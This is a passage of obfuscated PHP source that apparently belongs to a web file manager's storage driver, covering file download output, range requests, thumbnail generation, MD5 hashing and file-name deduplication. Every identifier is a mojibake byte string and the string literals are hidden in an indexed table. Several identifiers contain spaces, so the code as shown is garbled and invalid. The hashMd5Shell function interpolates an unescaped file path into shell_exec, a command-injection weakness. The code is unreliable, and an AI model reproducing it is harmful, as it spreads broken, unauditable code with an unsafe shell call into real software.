$ßÅÂŸŸ[78] => $”§¬Û™™[$ßÅÂŸŸ[78]]); if (isset($”§¬Û™™[$ßÅÂŸŸ[79]]) && !$”§¬Û™™[$ßÅÂŸŸ[78]]) { $ÒåŠåˆª[$ßÅÂŸŸ[79]] = $”§¬Û™™[$ßÅÂŸŸ[79]]; } if (isset($”§¬Û™™[$ßÅÂŸŸ[88]])) { $ÒåŠåˆª[$ßÅÂŸŸ[88]] = $”§¬Û™™[$ßÅÂŸŸ[88]]; } if (is_array($”§¬Û™™[$ßÅÂŸŸ[90]])) { $ÒåŠåˆª[$ßÅÂŸŸ[89]] = $”§¬Û™™[$ßÅÂŸŸ[90]][$ßÅÂŸŸ[87]]; $ÒåŠåˆª[$ßÅÂŸŸ[79]] = $”§¬Û™™[$ßÅÂŸŸ[90]][$ßÅÂŸŸ[79]]; $ÒåŠåˆª[$ßÅÂŸŸ[88]] = $”§¬Û™™[$ßÅÂŸŸ[90]][$ßÅÂŸŸ[88]]; } else { if (substr($”§¬Û™™[$ßÅÂŸŸ[87]], 0, strlen($öĞïñÅû)) == $öĞïñÅû) { $ÒåŠåˆª[$ßÅÂŸŸ[87]] = substr($”§¬Û™™[$ßÅÂŸŸ[87]], strlen($öĞïñÅû)); } } $ÈÒ½ß¸Ë = $”§¬Û™™[$ßÅÂŸŸ[78]] ? $ßÅÂŸŸ[8] : $ßÅÂŸŸ[12]; $ÒåŠåˆª[$ßÅÂŸŸ[89]] = rtrim($ÒåŠåˆª[$ßÅÂŸŸ[89]], $ßÅÂŸŸ[8]) . $ÈÒ½ß¸Ë; $ÒåŠåˆª[$ßÅÂŸŸ[87]] = $ßÅÂŸŸ[8] . trim($ÒåŠåˆª[$ßÅÂŸŸ[87]], $ßÅÂŸŸ[8]) . $ÈÒ½ß¸Ë; if (!$øúâÌĞ¹) { $ÔÛË†½ = explode($ßÅÂŸŸ[8], trim($ÒåŠåˆª[$ßÅÂŸŸ[87]], $ßÅÂŸŸ[8])); $ÒåŠåˆª[$ßÅÂŸŸ[87]] = $ßÅÂŸŸ[8] . implode($ßÅÂŸŸ[8], array_slice($ÔÛË†½, 1)) . $ÈÒ½ß¸Ë; } $ç‚…º—[] = $ÒåŠåˆª; } return array_sort_by($ç‚…º—, $ßÅÂŸŸ[87]); } public function upload($¼µ½€ëË, $ö©ßõĞó, $´ş¦ãÌ = false, $‡æ“ùş = REPEAT_REPLACE) { } public function uploadFileByID($÷ŠÇêö›, $ù§úƒİö, $öµËƒÊ¥) { } public function uploadFileByPath($Ğø¼âÁ÷, $óíçÚˆ³, $í·¦Õëá = array()) { } public function isUploadServer() { $§îƒÎ¸ =& $_SERVER[ˆ¡¹µ‹Â]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $§îƒÎ¸[91]) { return !0; } return $GLOBALS[$§îƒÎ¸[6]][$§îƒÎ¸[92]][$§îƒÎ¸[93]]; } public function isFileOutServer() { $²­éâğ‡ =& $_SERVER[ˆ¡¹µ‹Â]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $²­éâğ‡[91]) { return !0; } return $GLOBALS[$²­éâğ‡[6]][$²­éâğ‡[92]][$²­éâğ‡[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ôı ê›ª) { $±Ê†ÃÎ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$this->isCdnHost()) { return $ôı ê›ª; } return str_replace(trim(get_url_root($ôı ê›ª), $±Ê†ÃÎ[8]), trim($this->cdnHost, $±Ê†ÃÎ[8]), $ôı ê›ª); } public function uploadLink($Ó¢œË÷±, $ıšö­ = 0) { $ÒÍ€şÖŒ =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->isUploadServer()) { return; } $ãÆ¹€“± = $this->getType(); if (!in_array($ãÆ¹€“±, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $™Å˜Èçñ = 1024 * 1024 * 10; $ê¾ŒıÏ¬ = $ıšö­ <= $™Å˜Èçñ ? $ÒÍ€şÖŒ[95] : $ÒÍ€şÖŒ[96]; $÷ÏÕ¸—§ = (!$ıšö­ ? 1 : ceil($ıšö­ / pow(1024, 3))) * 3600 * 4; $Õ«€§¥ë = $this->{$ê¾ŒıÏ¬}($Ó¢œË÷±, $÷ÏÕ¸—§); if ($Õ«€§¥ë) { $Õ«€§¥ë[$ÒÍ€şÖŒ[97]] = $Ó¢œË÷±; $Õ«€§¥ë[$ÒÍ€şÖŒ[98]] = $ãÆ¹€“±; } return $Õ«€§¥ë; } public function uploadFormData($¢Æ†‘¬æ, $º©®’Ï„ = 3600) { } public function multiUploadFormData($×ûÉİ–ë, $±êÍ›Š = 3600) { } public function download($³È“İ¸ù, $“é“ÜÎó) { } public function ext($ò¥§‚¥¾) { $ÔÅ‚ÛÍÃ =& $_SERVER[ˆ¡¹µ‹Â]; if (strpos($ò¥§‚¥¾, $ÔÅ‚ÛÍÃ[8]) === -1) { $ûõŒèÆ¦ = $ò¥§‚¥¾; } else { $ûõŒèÆ¦ = $this->pathThis($ò¥§‚¥¾); } $†’îÈ¹ = $ÔÅ‚ÛÍÃ[12]; if (strstr($ûõŒèÆ¦, $ÔÅ‚ÛÍÃ[10])) { $†’îÈ¹ = substr($ûõŒèÆ¦, strrpos($ûõŒèÆ¦, $ÔÅ‚ÛÍÃ[10]) + 1); $†’îÈ¹ = strtolower($†’îÈ¹); } if (strlen($†’îÈ¹) > 3 && preg_match($ÔÅ‚ÛÍÃ[99], $†’îÈ¹, $ÃÜ±¬ü)) { $†’îÈ¹ = $ÔÅ‚ÛÍÃ[12]; } return $†’îÈ¹; } public function pathThis($Éõ†Û¦ô) { $î•ƒå¥¯ =& $_SERVER[ˆ¡¹µ‹Â]; $Éõ†Û¦ô = str_replace($î•ƒå¥¯[100], $î•ƒå¥¯[8], rtrim($Éõ†Û¦ô, $î•ƒå¥¯[8])); $€ÙÜÙñÉ = strrpos($Éõ†Û¦ô, $î•ƒå¥¯[8]); if ($€ÙÜÙñÉ === !1) { return $Éõ†Û¦ô; } return substr($Éõ†Û¦ô, $€ÙÜÙñÉ + 1); } public function pathFather($ì×¡İÔ¶) { $´”çó =& $_SERVER[ˆ¡¹µ‹Â]; $ì×¡İÔ¶ = str_replace($´”çó[100], $´”çó[8], rtrim($ì×¡İÔ¶, $´”çó[8])); $Ù×‚¶ø = strrpos($ì×¡İÔ¶, $´”çó[8]); if ($Ù×‚¶ø === !1) { return $´”çó[12]; } return substr($ì×¡İÔ¶, 0, $Ù×‚¶ø + 1); } public function hashSimple($Üšø»×) { $®„ş¿‘ò =& $_SERVER[ˆ¡¹µ‹Â]; if (!$Üšø»×) { return md5($®„ş¿‘ò[12]); } $®ÖúäÓ™ = $this->size($Üšø»×); $¿çö‚Ã÷ = 200; $Ê‚«¸ğ¨ = 50; if ($®ÖúäÓ™ <= $¿çö‚Ã÷ * $Ê‚«¸ğ¨) { return $this->hashMd5($Üšø»×) . $®ÖúäÓ™; } $ãçŞé• = intval($®ÖúäÓ™ / $Ê‚«¸ğ¨); $‰‘¤ò = $®„ş¿‘ò[12]; for ($Í¨İ¸öş = 0; $Í¨İ¸öş < $Ê‚«¸ğ¨; $Í¨İ¸öş++) { $‰‘¤ò .= $this->fileSubstr($Üšø»×, $ãçŞé• * $Í¨İ¸öş, $¿çö‚Ã÷); } $‰‘¤ò .= $this->fileSubstr($Üšø»×, $®ÖúäÓ™ - $¿çö‚Ã÷, $¿çö‚Ã÷); return md5($‰‘¤ò) . $®ÖúäÓ™; } public static $md5Cache = array(); public function hashMd5($—ôÉ¾Í¯) { if (!$—ôÉ¾Í¯) { return md5($_SERVER[ˆ¡¹µ‹Â][12]); } $—ôÉ¾Í¯ = $this->iconvSystem($—ôÉ¾Í¯); if (isset(self::$md5Cache[$—ôÉ¾Í¯])) { return self::$md5Cache[$—ôÉ¾Í¯]; } self::$md5Cache[$—ôÉ¾Í¯] = $this->hashMd5Shell($—ôÉ¾Í¯); if (!self::$md5Cache[$—ôÉ¾Í¯]) { self::$md5Cache[$—ôÉ¾Í¯] = @md5_file($—ôÉ¾Í¯); } return self::$md5Cache[$—ôÉ¾Í¯]; } private function hashMd5Shell($¢–õ˜È¯) { $£¨Á€×é =& $_SERVER[ˆ¡¹µ‹Â]; if (!$¢–õ˜È¯) { return md5($£¨Á€×é[12]); } if (!function_exists($£¨Á€×é[101])) { return !1; } $©º„è®ï = array($£¨Á€×é[102], $£¨Á€×é[103]); $Ò•™–Öş = Cache::get($£¨Á€×é[104]); if (!$Ò•™–Öş) { $‰îÇšëò = BASIC_PATH . $£¨Á€×é[105]; $“ª˜äÃ‹ = md5_file($‰îÇšëò); $Ò•™–Öş = $£¨Á€×é[106]; foreach ($©º„è®ï as $ˆÄíÛâô) { $º›£Ê† = shell_exec($ˆÄíÛâô . "\x20\42{$‰îÇšëò}\42"); if ($º›£Ê† && substr(trim($º›£Ê†), 0, 32) == $“ª˜äÃ‹) { $Ò•™–Öş = $ˆÄíÛâô; break; } } Cache::set($£¨Á€×é[104], $Ò•™–Öş, 3600); } if ($Ò•™–Öş == $£¨Á€×é[106]) { return !1; } $º›£Ê† = shell_exec($Ò•™–Öş . "\x20\42{$¢–õ˜È¯}\x22"); $º›£Ê† = str_replace($£¨Á€×é[107], $£¨Á€×é[12], $º›£Ê†); return substr($º›£Ê†, 0, 32); } public function link($ë‘šÄ) { return $ë‘šÄ; } public function fileOut($ æÒ…ô, $ÁÙˆÅ«À = false, $ôÅÈÀ = false, $À‘™ß…Î = '') { $´ªñ¡ÒÓ =& $_SERVER[ˆ¡¹µ‹Â]; $this->cacheMethod(null, null); if (!$ æÒ…ô || !$this->exist($ æÒ…ô)) { show_json(LNG($´ªñ¡ÒÓ[108]), !1, $ôÅÈÀ); } $Ç™›®ï© = $this->getType() == $´ªñ¡ÒÓ[109]; $îÃĞ‡ªí = $GLOBALS[$´ªñ¡ÒÓ[6]][$´ªñ¡ÒÓ[92]][$´ªñ¡ÒÓ[110]][$´ªñ¡ÒÓ[111]]; $ı€âš¡« = (double) $GLOBALS[$´ªñ¡ÒÓ[6]][$´ªñ¡ÒÓ[92]][$´ªñ¡ÒÓ[110]][$´ªñ¡ÒÓ[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ñâòã˜® = $this->infoFull($ æÒ…ô); $º¿©°¬» = $ñâòã˜®[$´ªñ¡ÒÓ[79]]; $‡À²ßÁ­ = gmdate($´ªñ¡ÒÓ[113], $ñâòã˜®[$´ªñ¡ÒÓ[88]]); $˜æ’·Ã = $ôÅÈÀ ? $ôÅÈÀ : $this->iconvApp($ñâòã˜®[$´ªñ¡ÒÓ[32]]); $š—¨Ÿıı = 0; $ı© ½Óœ = $º¿©°¬» - 1; $Ôí¡¯˜û = $this->ext($˜æ’·Ã); if (in_array($Ôí¡¯˜û, array($´ªñ¡ÒÓ[114], $´ªñ¡ÒÓ[115], $´ªñ¡ÒÓ[116], $´ªñ¡ÒÓ[117]))) { $Ôí¡¯˜û = $´ªñ¡ÒÓ[118]; } if (in_array($Ôí¡¯˜û, array($´ªñ¡ÒÓ[119]))) { $Ôí¡¯˜û = $´ªñ¡ÒÓ[120]; } if (!$À‘™ß…Î) { $À‘™ß…Î = md5($‡À²ßÁ­ . $º¿©°¬»); } $À‘™ß…Î = $´ªñ¡ÒÓ[121] . $À‘™ß…Î . $´ªñ¡ÒÓ[121]; $´ËÌ«ß’ = get_file_mime($Ôí¡¯˜û); $ñÃ´‚ÕĞ = !0; $ñÃ´‚ÕĞ = isset($_GET[$´ªñ¡ÒÓ[122]]) ? !1 : !0; if ($ÁÙˆÅ«À === !1 && !mime_support($´ËÌ«ß’)) { $´ËÌ«ß’ = $´ªñ¡ÒÓ[123]; } header($´ªñ¡ÒÓ[124]); header($´ªñ¡ÒÓ[125] . $´ËÌ«ß’); $®„Ëàöº = rawurlencode($˜æ’·Ã); $®„Ëàöº = $´ªñ¡ÒÓ[121] . $®„Ëàöº . $´ªñ¡ÒÓ[126] . $®„Ëàöº; if ($ÁÙˆÅ«À) { header($´ªñ¡ÒÓ[127]); header($´ªñ¡ÒÓ[128] . $®„Ëàöº); } else { if ($ñÃ´‚ÕĞ) { header($´ªñ¡ÒÓ[129] . $®„Ëàöº); } } $ÀÀåãÉ = 3600 * 24 * 30; header($´ªñ¡ÒÓ[130]); header($´ªñ¡ÒÓ[131]); header($´ªñ¡ÒÓ[132] . $ÀÀåãÉ); header($´ªñ¡ÒÓ[133] . gmdate($´ªñ¡ÒÓ[113], time() + $ÀÀåãÉ) . $´ªñ¡ÒÓ[134]); if (isset($_SERVER[$´ªñ¡ÒÓ[135]]) && strtotime($_SERVER[$´ªñ¡ÒÓ[135]]) == $ñâòã˜®[$´ªñ¡ÒÓ[88]]) { header($´ªñ¡ÒÓ[136], !0, 304); die; } if (isset($_SERVER[$´ªñ¡ÒÓ[137]]) && $_SERVER[$´ªñ¡ÒÓ[137]] == $À‘™ß…Î) { header($´ªñ¡ÒÓ[138] . $À‘™ß…Î, !0, 304); die; } header($´ªñ¡ÒÓ[138] . $À‘™ß…Î); header($´ªñ¡ÒÓ[139] . $‡À²ßÁ­ . $´ªñ¡ÒÓ[134]); header($´ªñ¡ÒÓ[140] . $˜æ’·Ã); header($´ªñ¡ÒÓ[141]); header($´ªñ¡ÒÓ[142] . $º¿©°¬»); header($´ªñ¡ÒÓ[143]); Hook::trigger($´ªñ¡ÒÓ[144], $ æÒ…ô, $º¿©°¬», $˜æ’·Ã, $Ôí¡¯˜û); if (!$ÁÙˆÅ«À && $Ôí¡¯˜û == $´ªñ¡ÒÓ[145]) { if ($º¿©°¬» > 1024 * 1024 * 5) { die; } $òûìóÎ§ = $this->getContent($ æÒ…ô); $òûìóÎ§ = Html::clearSVG($òûìóÎ§); header($´ªñ¡ÒÓ[146] . strlen($òûìóÎ§)); echo $òûìóÎ§; die; } $Šö²Êó§ = strtolower($_SERVER[$´ªñ¡ÒÓ[147]]); if ($Ç™›®ï© && $Šö²Êó§ && $îÃĞ‡ªí) { if (strstr($Šö²Êó§, $´ªñ¡ÒÓ[148])) { header($´ªñ¡ÒÓ[149] . $ æÒ…ô); } else { if (strstr($Šö²Êó§, $´ªñ¡ÒÓ[150])) { header($´ªñ¡ÒÓ[151] . $ æÒ…ô); } else { if (strstr($Šö²Êó§, $´ªñ¡ÒÓ[152])) { header($´ªñ¡ÒÓ[153] . $ æÒ…ô); } } } if ($ı€âš¡«) { header($´ªñ¡ÒÓ[154] . $ı€âš¡«); } return; } if (isset($_SERVER[$´ªñ¡ÒÓ[155]])) { if (preg_match($´ªñ¡ÒÓ[156], $_SERVER[$´ªñ¡ÒÓ[155]], $¦ñûõ³)) { $š—¨Ÿıı = intval($¦ñûõ³[1]); $š—¨Ÿıı = $š—¨Ÿıı <= 0 ? 0 : ($š—¨Ÿıı >= $ı© ½Óœ ? $ı© ½Óœ : $š—¨Ÿıı); if (!empty($¦ñûõ³[2])) { $ù ¾š´ = intval($¦ñûõ³[2]); $ı© ½Óœ = $ù ¾š´ < $š—¨Ÿıı ? $š—¨Ÿıı : ($ù ¾š´ >= $ı© ½Óœ ? $ı© ½Óœ : $ù ¾š´); } } header($´ªñ¡ÒÓ[157]); header("\103\157\156\164\145\156\x74\x2d\x52\141\156\147\x65\x3a\x20\x62\171\x74\145\163\40{$š—¨Ÿıı}\55{$ı© ½Óœ}\57" . $º¿©°¬»); } else { header($´ªñ¡ÒÓ[158]); } header($´ªñ¡ÒÓ[159]); header($´ªñ¡ÒÓ[160]); $ÚÁÛ¾Æ‹ = !0; if ($_SERVER[$´ªñ¡ÒÓ[161]] == $´ªñ¡ÒÓ[162] && $º¿©°¬» > 1204 * 1024 * 1024 * 2) { $ÚÁÛ¾Æ‹ = !1; } if ($ÚÁÛ¾Æ‹) { header($´ªñ¡ÒÓ[163] . ($ı© ½Óœ - $š—¨Ÿıı + 1)); } if ($_SERVER[$´ªñ¡ÒÓ[164]] == $´ªñ¡ÒÓ[165]) { return; } $ùõÜŸ²­ = array($´ªñ¡ÒÓ[166] => !1, $´ªñ¡ÒÓ[167] => $š—¨Ÿıı, $´ªñ¡ÒÓ[168] => $ı© ½Óœ, $´ªñ¡ÒÓ[169] => $Ôí¡¯˜û, $´ªñ¡ÒÓ[170] => $ñâòã˜®, $´ªñ¡ÒÓ[171] => $´ªñ¡ÒÓ[12], $´ªñ¡ÒÓ[172] => 0); $ùõÜŸ²­ = Hook::filter($´ªñ¡ÒÓ[173], $ùõÜŸ²­); $œŸ¦°âï = 1024 * 300; $ÅÌÌÎ†â = 0; if ($ı€âš¡«) { $ÅÌÌÎ†â = intval(1000 * 1000 * ($œŸ¦°âï / $ı€âš¡«)); } while ($š—¨Ÿıı <= $ı© ½Óœ) { $óİà…¥• = timeFloat(); check_abort(); $“ùÅÇÆÅ = $ı© ½Óœ - $š—¨Ÿıı + 1; if ($“ùÅÇÆÅ <= $œŸ¦°âï) { $œŸ¦°âï = $“ùÅÇÆÅ; } $òûìóÎ§ = $this->fileSubstr($ æÒ…ô, $š—¨Ÿıı, $œŸ¦°âï); if ($ùõÜŸ²­[$´ªñ¡ÒÓ[166]]) { $ùõÜŸ²­[$´ªñ¡ÒÓ[171]] = $òûìóÎ§; $ùõÜŸ²­[$´ªñ¡ÒÓ[172]] = $š—¨Ÿıı; $ùõÜŸ²­ = Hook::filter($´ªñ¡ÒÓ[174], $ùõÜŸ²­); $òûìóÎ§ = $ùõÜŸ²­[$´ªñ¡ÒÓ[171]]; } echo $òûìóÎ§; $š—¨Ÿıı += $œŸ¦°âï; if ($œŸ¦°âï == $“ùÅÇÆÅ) { $š—¨Ÿıı = $ı© ½Óœ + 1; } if ($ÅÌÌÎ†â) { $õ‚Ÿ–‡ù = intval(1000 * 1000 * (timeFloat() - $óİà…¥•)); $úŸÔõÕú = $ÅÌÌÎ†â - $õ‚Ÿ–‡ù; if ($úŸÔõÕú > 5) { usleep($úŸÔõÕú); } } } } public function fileOutServer($’¦»¸á¥, $™øıØ›¿ = false, $’İÎõµ = false, $³×´â¯– = '') { $this->fileOut($’¦»¸á¥, $™øıØ›¿, $’İÎõµ, $³×´â¯–); } public function fileOutLink($ãšÃ°Å„) { header($_SERVER[ˆ¡¹µ‹Â][175] . $ãšÃ°Å„); die; } public function cacheMethod($Õº©ëãÇ, $âÅ»¹†¾, $éêÛæñ” = null) { $¹Ÿö —Ë =& $_SERVER[ˆ¡¹µ‹Â]; static $³±œ¸ãÀ = array(); $Ö–È¿ƒ“ = $âÅ»¹†¾ ? ltrim($this->getPathOuter($âÅ»¹†¾), $¹Ÿö —Ë[8]) : $¹Ÿö —Ë[12]; $­‡æÓÚ‚ = $¹Ÿö —Ë[176] . $Õº©ëãÇ . $¹Ÿö —Ë[177] . rtrim($Ö–È¿ƒ“, $¹Ÿö —Ë[8]); if (is_null($Õº©ëãÇ)) { $³±œ¸ãÀ = array(); return; } if (is_null($âÅ»¹†¾)) { foreach ($³±œ¸ãÀ as $­‡æÓÚ‚ => $©ú­øê¦) { if (!strstr($­‡æÓÚ‚, $¹Ÿö —Ë[176] . $Õº©ëãÇ . $¹Ÿö —Ë[178])) { continue; } unset($³±œ¸ãÀ[$­‡æÓÚ‚]); } return; } if (!is_null($éêÛæñ”)) { $³±œ¸ãÀ[$­‡æÓÚ‚] = $éêÛæñ”; return; } $ø½Üİ›Á = isset($³±œ¸ãÀ[$­‡æÓÚ‚]) ? $³±œ¸ãÀ[$­‡æÓÚ‚] : null; if (!is_null($ø½Üİ›Á)) { return $ø½Üİ›Á; } $ø½Üİ›Á = $this->{$Õº©ëãÇ}($âÅ»¹†¾); $³±œ¸ãÀ[$­‡æÓÚ‚] = $ø½Üİ›Á; return $ø½Üİ›Á; } public function cacheMethodInfoSet($àÆ¶¯§ò, $…´Ğ›Ö, $¼àïÙÉé = false) { $«µ¸° =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($«µ¸°[179], $àÆ¶¯§ò, $…´Ğ›Ö); $this->cacheMethod($«µ¸°[180], $àÆ¶¯§ò, $…´Ğ›Ö ? !1 : !0); if (is_array($¼àïÙÉé)) { $this->cacheMethod($«µ¸°[181], $àÆ¶¯§ò, $¼àïÙÉé); } } public function fileOutImage($›³¤Üí, $õØ¦ïçó = 250) { $¹±ÈŒ¼ =& $_SERVER[ˆ¡¹µ‹Â]; set_timeout(); if (substr($›³¤Üí, 0, 4) == $¹±ÈŒ¼[152]) { $this->fileOutLink($›³¤Üí); } $‹¡¢ÙÃÇ = $this->info($›³¤Üí); $Š†Á«¥· = !1; $ûë¼¾ûò = isset($GLOBALS[$¹±ÈŒ¼[182]]) ? $GLOBALS[$¹±ÈŒ¼[182]] : array(); if ($ûë¼¾ûò && $ûë¼¾ûò[$¹±ÈŒ¼[183]] == $‹¡¢ÙÃÇ[$¹±ÈŒ¼[87]]) { $‹¡¢ÙÃÇ = $ûë¼¾ûò; $ÒşÌµôÖ = $‹¡¢ÙÃÇ[$¹±ÈŒ¼[184]]; if ($ÒşÌµôÖ && isset($ÒşÌµôÖ[$¹±ÈŒ¼[185]])) { if ($ÒşÌµôÖ[$¹±ÈŒ¼[185]] <= $õØ¦ïçó && $ÒşÌµôÖ[$¹±ÈŒ¼[186]] <= $õØ¦ïçó) { $Š†Á«¥· = !0; } } } if ($‹¡¢ÙÃÇ[$¹±ÈŒ¼[79]] <= 1024 * 50 || $Š†Á«¥· || !function_exists($¹±ÈŒ¼[187]) || $‹¡¢ÙÃÇ[$¹±ÈŒ¼[169]] == $¹±ÈŒ¼[188]) { return $this->fileOut($›³¤Üí, !1, $‹¡¢ÙÃÇ[$¹±ÈŒ¼[32]]); } $ÏÒÇßÌ¢ = kodIO::hashPath($‹¡¢ÙÃÇ); $¬ŸÕÓî = "\x63\157\166\x65\x72\x5f{$ÏÒÇßÌ¢}\137{$õØ¦ïçó}\x2e\x70\x6e\147"; $Ïâ¹©ªâ = IO_PATH_SYSTEM_TEMP . $¹±ÈŒ¼[189]; $‡€Ëì = IO::infoFullSimple($Ïâ¹©ªâ); $ƒç’êú° = $‡€Ëì && is_array($‡€Ëì) ? $‡€Ëì[$¹±ÈŒ¼[87]] : $¹±ÈŒ¼[12]; if (!$ƒç’êú°) { $ƒç’êú° = IO::mkdir($Ïâ¹©ªâ); } if ($‹¡¢ÙÃÇ[$¹±ÈŒ¼[190]] == $¹±ÈŒ¼[191] && isset($‹¡¢ÙÃÇ[$¹±ÈŒ¼[192]]) && $‹¡¢ÙÃÇ[$¹±ÈŒ¼[192]] == kodIO::sourceID($ƒç’êú°)) { $Ø­üĞâ¦ = $‹¡¢ÙÃÇ[$¹±ÈŒ¼[193]]; if ($õØ¦ïçó <= 500) { $å•“§¯© = preg_replace($¹±ÈŒ¼[194], $¹±ÈŒ¼[195], $‹¡¢ÙÃÇ[$¹±ÈŒ¼[32]]); $Ø­üĞâ¦ = IO::fileNameExist($ƒç’êú°, $å•“§¯©); } return IO::fileOut(KodIO::make($Ø­üĞâ¦), !1, $‹¡¢ÙÃÇ[$¹±ÈŒ¼[32]]); } $¹¤úÉßª = IO::fileNameExist($ƒç’êú°, $¬ŸÕÓî); if ($¹¤úÉßª) { return IO::fileOut(KodIO::make($¹¤úÉßª), !1, $‹¡¢ÙÃÇ[$¹±ÈŒ¼[32]]); } if ($õØ¦ïçó > 1000) { $this->makeImageCover($ƒç’êú°, $›³¤Üí, $¬ŸÕÓî, $õØ¦ïçó); $this->makeImageCover($ƒç’êú°, $›³¤Üí, "\x63\x6f\x76\145\162\137{$ÏÒÇßÌ¢}\x5f\62\65\60\56\x70\x6e\x67", 250); $¹¤úÉßª = IO::fileNameExist($ƒç’êú°, $¬ŸÕÓî); if ($¹¤úÉßª) { return IO::fileOut(KodIO::make($¹¤úÉßª), !1, $‹¡¢ÙÃÇ[$¹±ÈŒ¼[32]]); } die; } if (!kodIO::allowCover($‹¡¢ÙÃÇ)) { return $this->fileOut($›³¤Üí, !1, $‹¡¢ÙÃÇ[$¹±ÈŒ¼[32]]); } $ıÔŠ™²Í = Cache::get($¬ŸÕÓî); if ($ıÔŠ™²Í == $¹±ÈŒ¼[196] || $ıÔŠ™²Í == $¹±ÈŒ¼[197]) { echo $ıÔŠ™²Í; die; } Cache::set($¬ŸÕÓî, $¹±ÈŒ¼[197], 60); $Û’Ã½Û¥ = array($ƒç’êú°, $‹¡¢ÙÃÇ[$¹±ÈŒ¼[87]], $¬ŸÕÓî, $õØ¦ïçó); $ËÙ›İä = $¹±ÈŒ¼[198] . $‹¡¢ÙÃÇ[$¹±ÈŒ¼[79]] . $¹±ÈŒ¼[199] . $¬ŸÕÓî . $¹±ÈŒ¼[200] . $‹¡¢ÙÃÇ[$¹±ÈŒ¼[32]] . $¹±ÈŒ¼[201] . $‹¡¢ÙÃÇ[$¹±ÈŒ¼[87]]; TaskQueue::add($¹±ÈŒ¼[202], $Û’Ã½Û¥, $ËÙ›İä, $¬ŸÕÓî); } public function makeImageCover($¾ìÜß÷, $¡Ô’Ğ–É, $ÂïËõØ¨, $´µîÀ“ä) { $éáÅÒ£¨ =& $_SERVER[ˆ¡¹µ‹Â]; if (IO::fileNameExist($¾ìÜß÷, $ÂïËõØ¨)) { return $éáÅÒ£¨[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Á˜¿Óñ¬ = DATA_THUMB . $ÂïËõØ¨; del_file($Á˜¿Óñ¬); $Î†¿ƒ = IO::copy($¡Ô’Ğ–É, TEMP_FILES, !1, $ÂïËõØ¨); if (!@file_exists($Î†¿ƒ)) { return $éáÅÒ£¨[204]; } ImageThumb::createThumb($Î†¿ƒ, $Á˜¿Óñ¬, $´µîÀ“ä, $´µîÀ“ä * 10); if (@file_exists($Á˜¿Óñ¬)) { Cache::remove($ÂïËõØ¨); return IO::move($Á˜¿Óñ¬, $¾ìÜß÷); } Cache::set($ÂïËõØ¨, $éáÅÒ£¨[196], 600); del_file($Á˜¿Óñ¬); return $éáÅÒ£¨[205] . $Î†¿ƒ . $éáÅÒ£¨[74]; } public function fileOutImageServer($ôÂÂÆ…, $±³‡úÆƒ = 250) { $this->fileOutImage($ôÂÂÆ…, $±³‡úÆƒ); } public function fileNameAuto($§¢öÕŒÖ, $ÌñÓ„°î, $¦éÈ…¿â = REPEAT_RENAME, $ø „úä½ = false) { $ó©ßÛìç =& $_SERVER[ˆ¡¹µ‹Â]; $‹Ç¿¨¼ = $§¢öÕŒÖ === $ó©ßÛìç[12] ? $ÌñÓ„°î : rtrim($§¢öÕŒÖ, $ó©ßÛìç[8]) . $ó©ßÛìç[8] . $ÌñÓ„°î; if ($¦éÈ…¿â == REPEAT_REPLACE || !$this->exist($‹Ç¿¨¼) || $ø „úä½ && $¦éÈ…¿â != REPEAT_RENAME_FOLDER) { return $ÌñÓ„°î; } if ($¦éÈ…¿â == REPEAT_SKIP) { return !1; } $œÁ×öúã = $ó©ßÛìç[10] . get_path_ext($ÌñÓ„°î); $œÁ×öúã = $œÁ×öúã == $ó©ßÛìç[10] || $ø „úä½ ? $ó©ßÛìç[12] : $œÁ×öúã; $ì®Áú‘ = 1; $÷èÊİœ½ = substr($ÌñÓ„°î, 0, strlen($ÌñÓ„°î) - strlen($œÁ×öúã)); $‡Â¿¡¿ = $÷èÊİœ½ . "\x28{$ì®Áú‘}\51{$œÁ×öúã}"; while ($this->exist(rtrim($§¢öÕŒÖ, $ó©ßÛìç[8]) . $ó©ßÛìç[8] . $‡Â¿¡¿)) { $‡Â¿¡¿ = $÷èÊİœ½ . "\x28{$ì®Áú‘}\x29{$œÁ×öúã}"; $ì®Áú‘++; } return $‡Â¿¡¿; } private function fileNameAutoList($¯ò‡­î, $İë…ÒËµ, $¤áÚ®ì· = false) { $«üæŸÄ =& $_SERVER[ˆ¡¹µ‹Â]; $‰‰¯ŒÂ‡ = $this->listPath($¯ò‡­î, !0); $‰‰¯ŒÂ‡ = array_merge($‰‰¯ŒÂ‡[$«üæŸÄ[85]], $‰‰¯ŒÂ‡[$«üæŸÄ[86]]); $˜Ë¦»âØ = array_to_keyvalue($‰‰¯ŒÂ‡, $«üæŸÄ[12], $«üæŸÄ[32]); $ñ°ıØ¬ = $«üæŸÄ[10] . get_path_ext($İë…ÒËµ); $ñ°ıØ¬ = $ñ°ıØ¬ == $«üæŸÄ[10] || $¤áÚ®ì· ? $«üæŸÄ[12] : $ñ°ıØ¬; $äŠªïÜ÷ = substr($İë…ÒËµ, 0, strlen($İë…ÒËµ) - strlen($ñ°ıØ¬)); $È¿‰šÍ« = $äŠªïÜ÷ . "\50\60\x29{$ñ°ıØ¬}"; for ($üİª‰åº = 1; $üİª‰åº <= count($˜Ë¦»âØ) + 1; $üİª‰åº++) { $È¿‰šÍ« = $äŠªïÜ÷ . "\50{$üİª‰åº}\51{$ñ°ıØ¬}"; if (!in_array_not_case($È¿‰šÍ«, $˜Ë¦»âØ)) { return $È¿‰šÍ«; } } return $È¿‰šÍ«; } public function listAllFiles($ÂœØíÊŒ, $üåá–Éœ) { $–„ºñüó =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($üåá–Éœ)) { return array(); } $Á¢¢Íú = array_keys($üåá–Éœ); $—«¸÷ = array(); $ÂœØíÊŒ = trim($ÂœØíÊŒ, $–„ºñüó[8]); foreach ($üåá–Éœ as $ã¯ô·Î¿ => $Ñùş©·í) { $‡Ñ×ó· = ltrim(substr(trim($ã¯ô·Î¿, $–„ºñüó[8]), strlen($ÂœØíÊŒ)), $–„ºñüó[8]); if 